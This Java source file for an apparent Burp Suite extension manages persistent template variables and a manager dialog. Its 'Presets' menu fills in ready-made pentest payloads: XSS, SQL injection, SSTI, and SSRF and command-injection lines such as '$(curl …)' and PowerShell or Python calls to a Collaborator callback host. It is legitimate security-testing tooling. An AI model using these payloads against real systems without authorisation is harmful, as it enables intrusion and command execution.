package com.procolorview.util;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.persistence.PersistedObject;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Template Variables Manager for Pro Color View.
 *
 * Allows users to define named variables (e.g. {{token}}, {{host}})
 * and apply them to text, replacing placeholders with their values.
 *
 * Variables are GLOBAL — shared across all editor instances via a
 * static store, so a variable defined in one tab is usable in any other.
 *
 * Variables are PERSISTED in the Burp project file via the Montoya
 * Persistence API, so they survive extension reloads and project re-opens.
 */
public class TemplateVars {

    /** Global variable store: name → value */
    private static final Map<String, String> VARS = new LinkedHashMap<>();

    /** Pattern to match {{variableName}} */
    private static final Pattern VAR_PATTERN = Pattern.compile("\\{\\{\\s*([A-Za-z0-9_.-]+)\\s*\\}\\}");

    /** Prefix for persisted variable keys */
    private static final String PERSIST_PREFIX = "pcv_var_";
    /** Key for persisted variable ordering */
    private static final String ORDER_KEY = "pcv_var__order_";

    /** Reference to Burp API for persistence (set once at init) */
    private static MontoyaApi burpApi;

    // ── Initialization ─────────────────────────────────────────────

    /** Must be called once from ProColorExtension.initialize() */
    public static void init(MontoyaApi api) {
        burpApi = api;
        loadFromProject();
    }

    /** Load all variables from the Burp project's extension data, preserving insertion order. */
    private static void loadFromProject() {
        if (burpApi == null) return;
        try {
            PersistedObject data = burpApi.persistence().extensionData();

            // First, load all var values into a temporary map
            Map<String, String> allVars = new LinkedHashMap<>();
            for (String key : data.stringKeys()) {
                if (key.startsWith(PERSIST_PREFIX) && !key.equals(ORDER_KEY)) {
                    String varName = key.substring(PERSIST_PREFIX.length());
                    String value = data.getString(key);
                    if (value != null) {
                        allVars.put(varName, value);
                    }
                }
            }

            // Then, apply ordering from the saved order key
            String orderStr = data.getString(ORDER_KEY);
            if (orderStr != null && !orderStr.isEmpty()) {
                String[] orderedNames = orderStr.split("\n");
                for (String name : orderedNames) {
                    if (allVars.containsKey(name)) {
                        VARS.put(name, allVars.remove(name));
                    }
                }
            }
            // Add any remaining vars not in the order list (backwards compatibility)
            VARS.putAll(allVars);
        } catch (Exception ignored) {
            // If persistence not available, continue with empty vars
        }
    }

    /** Save all current variables to the Burp project's extension data, preserving order. */
    private static void saveToProject() {
        if (burpApi == null) return;
        try {
            PersistedObject data = burpApi.persistence().extensionData();
            // Remove old persisted vars
            for (String key : new java.util.ArrayList<>(data.stringKeys())) {
                if (key.startsWith(PERSIST_PREFIX) || key.equals(ORDER_KEY)) {
                    data.deleteString(key);
                }
            }
            // Write current vars
            StringBuilder orderBuilder = new StringBuilder();
            for (Map.Entry<String, String> e : VARS.entrySet()) {
                data.setString(PERSIST_PREFIX + e.getKey(), e.getValue());
                if (orderBuilder.length() > 0) orderBuilder.append("\n");
                orderBuilder.append(e.getKey());
            }
            // Save ordering
            data.setString(ORDER_KEY, orderBuilder.toString());
        } catch (Exception ignored) {
            // Best effort persistence
        }
    }

    // ── Core API ────────────────────────────────────────────────────

    public static Map<String, String> getAll() {
        return new LinkedHashMap<>(VARS);
    }

    public static void set(String name, String value) {
        VARS.put(name, value);
        saveToProject();
    }

    public static void remove(String name) {
        VARS.remove(name);
        saveToProject();
    }

    public static void clear() {
        VARS.clear();
        saveToProject();
    }

    public static String get(String name) {
        return VARS.getOrDefault(name, "");
    }

    /** Replace all {{var}} placeholders in text with their values. */
    public static String apply(String text) {
        if (text == null || VARS.isEmpty()) return text;
        Matcher m = VAR_PATTERN.matcher(text);
        StringBuilder sb = new StringBuilder();
        while (m.find()) {
            String varName = m.group(1);
            String value = VARS.get(varName);
            if (value != null) {
                m.appendReplacement(sb, Matcher.quoteReplacement(value));
            }
            // if var not defined, leave {{var}} as-is
        }
        m.appendTail(sb);
        return sb.toString();
    }

    /** Count how many {{var}} placeholders exist in text. */
    public static int countPlaceholders(String text) {
        if (text == null) return 0;
        Matcher m = VAR_PATTERN.matcher(text);
        int count = 0;
        while (m.find()) count++;
        return count;
    }

    /** Find unresolved {{var}} names (defined in text but not in VARS). */
    public static java.util.List<String> findUnresolved(String text) {
        java.util.List<String> unresolved = new java.util.ArrayList<>();
        if (text == null) return unresolved;
        Matcher m = VAR_PATTERN.matcher(text);
        while (m.find()) {
            String name = m.group(1);
            if (!VARS.containsKey(name) && !unresolved.contains(name)) {
                unresolved.add(name);
            }
        }
        return unresolved;
    }

    // ── Bulk update (used by the Manager dialog) ───────────────────

    /** Replace all variables at once and persist. */
    public static void replaceAll(Map<String, String> newVars) {
        VARS.clear();
        VARS.putAll(newVars);
        saveToProject();
    }

    // ── UI: Variable Manager Dialog ─────────────────────────────────

    /**
     * Opens a dialog to manage template variables.
     * Returns true if the user clicked Apply (variables may have changed).
     * @param insertCallback if non-null, enables Insert buttons that send text to the editor
     */
    public static boolean showManagerDialog(Component parent, Color bg, Color fg, Font font,
                                             Consumer<String> insertCallback) {
        // Table model: [Name, Value]
        String[] cols = {"Variable Name", "Value"};
        DefaultTableModel model = new DefaultTableModel(cols, 0) {
            @Override public boolean isCellEditable(int r, int c) { return true; }
        };
        // Populate with existing vars
        for (Map.Entry<String, String> e : VARS.entrySet()) {
            model.addRow(new Object[]{e.getKey(), e.getValue()});
        }
        // Always add an empty row for new entries
        model.addRow(new Object[]{"", ""});

        JTable table = new JTable(model);
        table.setFont(font);
        table.setBackground(bg);
        table.setForeground(fg);
        table.setGridColor(new Color(80, 80, 80));
        table.setRowHeight(24);
        table.getTableHeader().setFont(font.deriveFont(Font.BOLD));
        table.setSelectionBackground(new Color(50, 80, 120));
        table.setSelectionForeground(Color.WHITE);

        // Auto-add new row when user types in the last empty row
        model.addTableModelListener(e -> {
            int lastRow = model.getRowCount() - 1;
            if (lastRow >= 0) {
                Object name = model.getValueAt(lastRow, 0);
                Object val  = model.getValueAt(lastRow, 1);
                boolean hasData = (name != null && !name.toString().isEmpty()) ||
                                  (val != null && !val.toString().isEmpty());
                if (hasData) {
                    SwingUtilities.invokeLater(() -> model.addRow(new Object[]{"", ""}));
                }
            }
        });

        JScrollPane sp = new JScrollPane(table);
        sp.setPreferredSize(new Dimension(500, 280));

        // Buttons
        JButton addBtn = new JButton("+ Add Row");
        addBtn.addActionListener(e -> model.addRow(new Object[]{"", ""}));
        JButton delBtn = new JButton("- Delete Selected");
        delBtn.addActionListener(e -> {
            int row = table.getSelectedRow();
            if (row >= 0 && model.getRowCount() > 1) model.removeRow(row);
        });
        JButton clearBtn = new JButton("Clear All");
        clearBtn.addActionListener(e -> {
            model.setRowCount(0);
            model.addRow(new Object[]{"", ""});
        });

        // Import from selected text hint
        JLabel hint = new JLabel("Variables persist in the Burp project. Use {{name}} in the editor.");
        hint.setFont(font.deriveFont(Font.ITALIC, 11f));
        hint.setForeground(new Color(140, 140, 160));

        // Presets dropdown
        JButton presetsBtn = new JButton("Presets \u25BC");
        JPopupMenu presetsMenu = new JPopupMenu();
        // Generate Collaborator payload if available
        String collabDomain = "";
        try {
            if (burpApi != null) {
                collabDomain = burpApi.collaborator().defaultPayloadGenerator()
                        .generatePayload().toString();
            }
        } catch (Exception ignored) {}
        final String collab = collabDomain;

        String[][] presets = {
            {"Pentest Basic", "target_host,target_port,protocol,base_url,token,session_id,csrf_token,username,password"},
            {"API Testing", "api_key,api_secret,bearer_token,base_url,content_type,user_id,org_id"},
            {"Bug Bounty", "target,scope_domain,out_of_scope,proxy,wordlist_path,burp_collab"},
            {"XSS Payloads", "xss_basic,xss_img,xss_svg,xss_event,xss_polyglot,xss_encoded"},
            {"Blind XSS (Collaborator)", "bxss_script,bxss_img,bxss_svg,bxss_iframe,bxss_body,bxss_input"},
            {"RCE (Collaborator)", "rce_curl,rce_wget,rce_nslookup,rce_ping,rce_powershell,rce_python,rce_bash_redirect"},
            {"SQLi Payloads", "sqli_union,sqli_blind,sqli_time,sqli_error,sqli_stacked"},
            {"SSRF (Collaborator)", "ssrf_http,ssrf_https,ssrf_dns"},
            {"SSTI Payloads", "ssti_jinja2,ssti_twig,ssti_freemarker,ssti_velocity"},
        };
        // Default values for payload presets
        Map<String, String> payloadDefaults = new LinkedHashMap<>();
        // XSS basic
        payloadDefaults.put("xss_basic", "<script>alert(1)</script>");
        payloadDefaults.put("xss_img", "<img src=x onerror=alert(1)>");
        payloadDefaults.put("xss_svg", "<svg onload=alert(1)>");
        payloadDefaults.put("xss_event", "\" onfocus=alert(1) autofocus=\"");
        payloadDefaults.put("xss_polyglot", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik11//oNcliCk=alert()//<script>%0dconfirm``//");
        payloadDefaults.put("xss_encoded", "%3Cscript%3Ealert(1)%3C%2Fscript%3E");
        // Blind XSS with Collaborator
        payloadDefaults.put("bxss_script", collab.isEmpty() ? "<script src=//COLLAB_HERE></script>" :
                "<script src=//" + collab + "></script>");
        payloadDefaults.put("bxss_img", collab.isEmpty() ? "<img src=//COLLAB_HERE>" :
                "<img src=//" + collab + ">");
        payloadDefaults.put("bxss_svg", collab.isEmpty() ? "<svg onload=fetch('//COLLAB_HERE')>" :
                "<svg onload=fetch('//" + collab + "')>");
        payloadDefaults.put("bxss_iframe", collab.isEmpty() ? "<iframe src=//COLLAB_HERE></iframe>" :
                "<iframe src=//" + collab + "></iframe>");
        payloadDefaults.put("bxss_body", collab.isEmpty() ? "\"><body onload=fetch('//COLLAB_HERE')>" :
                "\"><body onload=fetch('//" + collab + "')>");
        payloadDefaults.put("bxss_input", collab.isEmpty() ? "\"><input onfocus=fetch('//COLLAB_HERE') autofocus>" :
                "\"><input onfocus=fetch('//" + collab + "') autofocus>");
        // RCE with Collaborator
        payloadDefaults.put("rce_curl", collab.isEmpty() ? "$(curl COLLAB_HERE)" :
                "$(curl " + collab + ")");
        payloadDefaults.put("rce_wget", collab.isEmpty() ? "$(wget COLLAB_HERE)" :
                "$(wget " + collab + ")");
        payloadDefaults.put("rce_nslookup", collab.isEmpty() ? "$(nslookup COLLAB_HERE)" :
                "$(nslookup " + collab + ")");
        payloadDefaults.put("rce_ping", collab.isEmpty() ? "$(ping -c1 COLLAB_HERE)" :
                "$(ping -c1 " + collab + ")");
        payloadDefaults.put("rce_powershell", collab.isEmpty() ? "powershell -c \"Invoke-WebRequest COLLAB_HERE\"" :
                "powershell -c \"Invoke-WebRequest " + collab + "\"");
        payloadDefaults.put("rce_python", collab.isEmpty() ? "__import__('os').system('curl COLLAB_HERE')" :
                "__import__('os').system('curl " + collab + "')");
        payloadDefaults.put("rce_bash_redirect", collab.isEmpty() ? "`curl COLLAB_HERE`" :
                "`curl " + collab + "`");
        // SQLi
        payloadDefaults.put("sqli_union", "' UNION SELECT NULL,NULL,NULL--");
        payloadDefaults.put("sqli_blind", "' AND 1=1--");
        payloadDefaults.put("sqli_time", "' AND SLEEP(5)--");
        payloadDefaults.put("sqli_error", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--");
        payloadDefaults.put("sqli_stacked", "'; WAITFOR DELAY '0:0:5'--");
        // SSRF with Collaborator
        payloadDefaults.put("ssrf_http", collab.isEmpty() ? "http://COLLAB_HERE" :
                "http://" + collab);
        payloadDefaults.put("ssrf_https", collab.isEmpty() ? "https://COLLAB_HERE" :
                "https://" + collab);
        payloadDefaults.put("ssrf_dns", collab.isEmpty() ? "COLLAB_HERE" : collab);
        // SSTI
        payloadDefaults.put("ssti_jinja2", "{{7*7}}");
        payloadDefaults.put("ssti_twig", "{{7*'7'}}");
        payloadDefaults.put("ssti_freemarker", "${7*7}");
        payloadDefaults.put("ssti_velocity", "#set($x=7*7)$x");

        for (String[] preset : presets) {
            JMenuItem item = new JMenuItem(preset[0]);
            item.addActionListener(e -> {
                for (String varName : preset[1].split(",")) {
                    varName = varName.trim();
                    if (!varName.isEmpty()) {
                        // Don't overwrite existing values
                        boolean exists = false;
                        for (int r = 0; r < model.getRowCount(); r++) {
                            if (varName.equals(model.getValueAt(r, 0))) { exists = true; break; }
                        }
                        if (!exists) {
                            // Insert before the last empty row, with default value if available
                            int insertAt = model.getRowCount() - 1;
                            String defVal = payloadDefaults.getOrDefault(varName, "");
                            model.insertRow(insertAt, new Object[]{varName, defVal});
                        }
                    }
                }
            });
            presetsMenu.add(item);
        }
        presetsBtn.addActionListener(e -> presetsMenu.show(presetsBtn, 0, presetsBtn.getHeight()));

        // Insert buttons (only if callback is provided)
        JButton insertVarBtn = new JButton("Insert {{var}}");
        insertVarBtn.setToolTipText("Insert the {{variable}} placeholder at the cursor position in the editor");
        insertVarBtn.setEnabled(false);
        insertVarBtn.addActionListener(e -> {
            if (insertCallback == null) return;
            int row = table.getSelectedRow();
            if (row < 0) return;
            // Save current table state before closing
            if (table.isEditing()) table.getCellEditor().stopCellEditing();
            saveTableToVars(model);
            Object nameObj = model.getValueAt(row, 0);
            if (nameObj != null && !nameObj.toString().trim().isEmpty()) {
                insertCallback.accept("{{" + nameObj.toString().trim() + "}}");
            }
            // Auto-close dialog
            closeParentDialog(table);
        });

        JButton insertValBtn = new JButton("Insert Value");
        insertValBtn.setToolTipText("Insert the raw value of the variable at the cursor position in the editor");
        insertValBtn.setEnabled(false);
        insertValBtn.addActionListener(e -> {
            if (insertCallback == null) return;
            int row = table.getSelectedRow();
            if (row < 0) return;
            // Save current table state before closing
            if (table.isEditing()) table.getCellEditor().stopCellEditing();
            saveTableToVars(model);
            Object valObj = model.getValueAt(row, 1);
            if (valObj != null && !valObj.toString().isEmpty()) {
                insertCallback.accept(valObj.toString());
            }
            // Auto-close dialog
            closeParentDialog(table);
        });

        // Enable insert buttons when a row is selected
        table.getSelectionModel().addListSelectionListener(e -> {
            if (e.getValueIsAdjusting()) return;
            boolean hasSel = table.getSelectedRow() >= 0;
            insertVarBtn.setEnabled(hasSel && insertCallback != null);
            insertValBtn.setEnabled(hasSel && insertCallback != null);
        });

        JPanel btnPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 4, 0));
        btnPanel.add(addBtn);
        btnPanel.add(delBtn);
        btnPanel.add(clearBtn);
        btnPanel.add(presetsBtn);
        if (insertCallback != null) {
            btnPanel.add(Box.createHorizontalStrut(8));
            insertVarBtn.setForeground(new Color(100, 200, 255));
            insertValBtn.setForeground(new Color(255, 200, 100));
            btnPanel.add(insertVarBtn);
            btnPanel.add(insertValBtn);
        }

        JPanel topPanel = new JPanel(new BorderLayout(0, 4));
        topPanel.add(hint, BorderLayout.NORTH);
        topPanel.add(sp, BorderLayout.CENTER);
        topPanel.add(btnPanel, BorderLayout.SOUTH);

        int result = JOptionPane.showConfirmDialog(parent, topPanel,
                "Template Variables Manager", JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);

        if (result == JOptionPane.OK_OPTION) {
            // Stop any cell editing
            if (table.isEditing()) table.getCellEditor().stopCellEditing();
            // Collect new vars
            Map<String, String> newVars = new LinkedHashMap<>();
            for (int r = 0; r < model.getRowCount(); r++) {
                Object nameObj = model.getValueAt(r, 0);
                Object valObj  = model.getValueAt(r, 1);
                String name = nameObj != null ? nameObj.toString().trim() : "";
                String val  = valObj != null ? valObj.toString() : "";
                if (!name.isEmpty()) {
                    newVars.put(name, val);
                }
            }
            replaceAll(newVars);
            return true;
        }
        return false;
    }

    /** Save table contents to VARS map */
    private static void saveTableToVars(javax.swing.table.DefaultTableModel model) {
        java.util.Map<String, String> newVars = new java.util.LinkedHashMap<>();
        for (int r = 0; r < model.getRowCount(); r++) {
            Object nameObj = model.getValueAt(r, 0);
            Object valObj  = model.getValueAt(r, 1);
            String name = nameObj != null ? nameObj.toString().trim() : "";
            String val  = valObj != null ? valObj.toString() : "";
            if (!name.isEmpty()) {
                newVars.put(name, val);
            }
        }
        replaceAll(newVars);
    }

    /** Close the JOptionPane dialog that contains this component */
    private static void closeParentDialog(java.awt.Component comp) {
        java.awt.Window win = javax.swing.SwingUtilities.getWindowAncestor(comp);
        if (win instanceof java.awt.Dialog) {
            win.dispose();
        }
    }

    /** Quick-set dialog: set a single variable from selected text */
    public static boolean quickSet(Component parent, String selectedText) {
        String name = JOptionPane.showInputDialog(parent,
                "Variable name for the selected text:\n(use as {{name}} in any editor)",
                "Quick Set Variable", JOptionPane.QUESTION_MESSAGE);
        if (name != null && !name.trim().isEmpty()) {
            set(name.trim(), selectedText);
            return true;
        }
        return false;
    }
}
